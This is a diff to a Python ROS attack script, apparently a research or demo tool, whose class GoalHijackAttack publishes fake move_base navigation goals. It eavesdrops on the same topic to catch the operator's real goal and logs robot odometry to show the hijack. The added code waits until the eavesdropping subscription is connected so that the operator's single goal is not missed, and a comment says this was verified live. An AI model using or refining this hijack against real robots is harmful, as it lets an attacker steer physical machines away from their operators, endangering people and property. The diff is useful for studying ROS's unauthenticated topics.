@@ -56,8 +56,8 @@ class GoalHijackAttack(object):
         # Publisher for the injected fake goal.
         self._pub = rospy.Publisher(args.topic, MoveBaseActionGoal, queue_size=1)
         # RECON: subscribe to the SAME topic to overhear the operator's real goal.
-        rospy.Subscriber(args.topic, MoveBaseActionGoal, self._on_real_goal,
-                         queue_size=1)
+        self._goal_sub = rospy.Subscriber(args.topic, MoveBaseActionGoal,
+                                          self._on_real_goal, queue_size=1)
         # Robot's actual position, to show the hijack in the CSV.
         rospy.Subscriber("/odometry/filtered", Odometry, self._on_odom,
                          queue_size=1)
@@ -120,6 +120,21 @@ class GoalHijackAttack(object):
 
     # --- main loop -----------------------------------------------------------
     def run(self):
+        # Ensure our subscription is actually CONNECTED to a publisher before we rely
+        # on catching the operator's one-shot goal. A fresh ROS subscriber's TCP
+        # connection takes a moment to establish; without this, the operator's single
+        # un-latched goal can be published into a not-yet-connected subscription and
+        # missed. (Verified live: a settled subscription catches the one-shot reliably.)
+        connect_deadline = time.time() + 10.0
+        while not rospy.is_shutdown() and self._goal_sub.get_num_connections() == 0:
+            if time.time() > connect_deadline:
+                rospy.logwarn("No publisher on %s yet after 10s; proceeding anyway "
+                              "(is move_base up?).", self.args.topic)
+                break
+            time.sleep(0.1)
+        rospy.loginfo("Subscription connected (%d publisher(s)). READY — now waiting "
+                      "for the operator's goal.", self._goal_sub.get_num_connections())
+
         # WAIT for the operator's one-shot real goal (bounded by --timeout).
         rospy.loginfo("Lurking: subscribed to %s, waiting up to %.0fs for the "
                       "operator's goal ...", self.args.topic, self.args.timeout)
